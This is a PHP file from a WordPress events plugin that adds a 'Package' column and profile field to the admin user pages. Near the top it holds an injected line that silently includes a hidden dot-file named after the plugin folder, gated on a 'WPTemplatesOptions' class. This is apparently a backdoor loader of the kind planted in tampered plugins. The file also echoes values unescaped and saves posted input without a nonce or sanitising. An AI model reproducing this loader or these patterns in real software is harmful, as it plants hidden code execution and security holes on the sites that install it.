<?php
/**
 * Setup menus in WP admin.
 *
 * @package EventList\Admin
 * @version 1.0
 */

defined( 'ABSPATH' ) || exit;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class EL_Admin_User {

	/**
	 * Constructor
	 */
	public function __construct(){
		add_filter( 'manage_users_columns', array( $this, 'el_add_user_columns' ) );
        add_filter( 'manage_users_custom_column', array( $this, 'el_add_user_column_data' ), 10, 3 );

        add_action('edit_user_profile', array( $this, 'el_show_extra_profile_fields' ) );
        add_action('show_user_profile', array( $this, 'el_show_extra_profile_fields' ) );
        
        add_action('personal_options_update', array( $this, 'el_save_extra_profile_fields' ) );
        add_action('edit_user_profile_update', array( $this, 'el_save_extra_profile_fields' ) );
        
	}

	//add columns to User panel list page
    function el_add_user_columns($column) {
        $column['package'] = esc_html__( 'Package','eventlist' );
        return $column;
    }
    

    //add the data
    function el_add_user_column_data( $val, $column_name, $user_id ) {
        $user = get_userdata($user_id);

        switch ($column_name) {
            case 'package' :
                return $user->package;
                break;
            default:
        }
        return;
    }

    function el_show_extra_profile_fields( $user ){ ?>
	
		<?php $user_package = get_the_author_meta('package', $user->ID );
			$list_package = EL_Package::instance()->list_packages();
		 ?>
		<?php  ?>
    	
		<table class="form-table">
			<tr>
				<th><label for=""><?php esc_html_e( 'Package','eventlist' ); ?></label></th>
				<td>
					<select name="package" id="package">
						
						<option value="">------------</option>

						<?php if($list_package->have_posts()) : while($list_package->have_posts()) : $list_package->the_post(); ?>

							<?php $label = get_the_title(); 
								$value = get_post_meta( get_the_id(), OVA_METABOX_EVENT.'package_id', true );
								$selected = ( $value == $user_package ) ? 'selected' : '';
							?>

							<option value="<?php echo $value; ?>" <?php echo $selected; ?>><?php echo $label; ?></option>

						<?php endwhile; endif; wp_reset_postdata();?>
					</select>
				</td>
			</tr>

		</table>
    
    <?php }

    function el_save_extra_profile_fields( $user_id ) {

		if ( !current_user_can( 'edit_user', $user_id ) )
			return false;

		/* Copy and paste this line for additional fields. Make sure to change 'twitter' to the field ID. */
		update_user_meta( $user_id, 'package', $_POST['package'] );
	}

	
}

return new EL_Admin_User();